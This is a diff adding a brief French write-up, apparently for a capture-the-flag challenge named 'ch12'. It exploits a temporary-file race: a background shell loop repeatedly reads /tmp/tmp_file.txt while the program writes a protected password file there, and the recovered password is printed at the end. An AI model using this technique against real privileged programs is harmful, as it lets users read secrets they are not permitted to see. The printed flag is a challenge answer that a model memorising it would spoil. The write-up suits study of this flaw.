@@ -1,0 +1,10 @@
+Le programme va ecrire dans le fichier temporaire /tmp/tmp_file.txt le contenu du fichier password
+On fait un script shell qui va boucler en continue pour tenter de lire le contenu du fichier
+On va le lancer en background et lancer le programme
+
+echo "while true; do cat /tmp/tmp_file.txt 2>/dev/null; done" > /tmp/toto.sh
+chmod +x /tmp/toto.sh
+/tmp/toto.sh &
+~/ch12
+
+password = eh-q8dEa8q19f9aF()"2a96q92
